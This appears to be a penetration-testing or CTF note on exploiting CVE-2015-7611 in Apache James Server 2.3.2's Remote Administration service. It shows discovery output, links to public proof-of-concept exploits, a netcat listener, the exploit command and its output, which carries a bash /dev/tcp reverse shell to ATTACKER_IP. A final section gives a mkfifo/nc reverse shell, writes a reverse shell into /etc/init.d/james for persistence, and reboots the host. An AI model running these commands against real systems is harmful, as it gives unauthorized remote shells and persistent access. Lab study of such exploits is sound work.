# Apache James Server

Apache James Server `2.3.2` exposes multiple mail services and a Remote Administration service. The Remote Administration service can be abused for unauthenticated command execution that triggers when a user logs in.

## Discovery

Useful indicators:

```text
32822/tcp open  james-admin  JAMES Remote Admin 2.3.2
32823/tcp open  nntp         JAMES nntpd (posting ok)
32824/tcp open  pop3         JAMES pop3d 2.3.2
32825/tcp open  smtp         JAMES smtpd 2.3.2
32826/tcp open  ssh          OpenSSH 7.6p1 Ubuntu
```

The vulnerable service is:

```text
james-admin JAMES Remote Admin 2.3.2
```

## RCE

Public PoC used:

```text
https://github.com/CyberQuestor-infosec/Apache-James-Server-2.3.2_Unauthenticated-Remote-Command-Execution-RCE
https://www.exploit-db.com/exploits/35513
https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/
```

Update the PoC ports for the target service layout, then start a listener:

```bash
nc -nlvp 80
```

Run the exploit:

```bash
python3 exploit.py TARGET ATTACKER_IP 80
```

Successful exploit output:

```text
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 80 before logging in!
```

Trigger the payload by logging in to SSH, then catch the shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
challenge@HOST:~$
```

## Reboot-Triggered Payload

Another James `2.3.2` path writes a reverse-shell command into the target's init script and then reboots the service host:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc ATTACKER_IP 3333 >/tmp/f
echo "#!/bin/bash" > /etc/init.d/james
echo "bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1" >> /etc/init.d/james
cat /etc/init.d/james
sudo /sbin/reboot
```
